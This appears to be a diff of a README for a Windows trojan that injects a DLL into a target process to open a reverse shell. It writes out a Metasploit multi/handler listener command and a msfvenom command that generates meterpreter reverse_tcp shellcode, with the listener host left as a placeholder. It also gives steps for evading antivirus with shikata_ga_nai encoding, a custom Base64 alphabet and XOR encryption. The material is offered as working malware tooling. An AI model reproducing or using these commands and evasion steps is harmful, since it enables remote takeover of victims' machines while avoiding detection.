@@ -7,7 +7,7 @@ Trojan using dll injection of a custom library that spawns a shell on a target m
 
 This malware injects a malicious library into a target process or directly creates a process and uploads the library into it, the dll contains a simple encoded base64 data that spawns a reverse shell.
 
-### 0) Listener
+### 0) Listener and payload
 
 - First i used the classic multi handler exploit to run the payload: 
 ``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
@@ -15,10 +15,10 @@ This malware injects a malicious library into a target process or directly creat
 - The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
 ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 
 
-### 0.1) Encrypter:
-
-- First we encode binary data into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more;
-- Secondly we apply XOR encryption using a single-byte key; 
+- Once we have the shellcode we encode the binary data into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more;
+  
+- Secondly we apply XOR encryption using a single-byte key;
+  
 - Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.
 
 ### 1) DLL
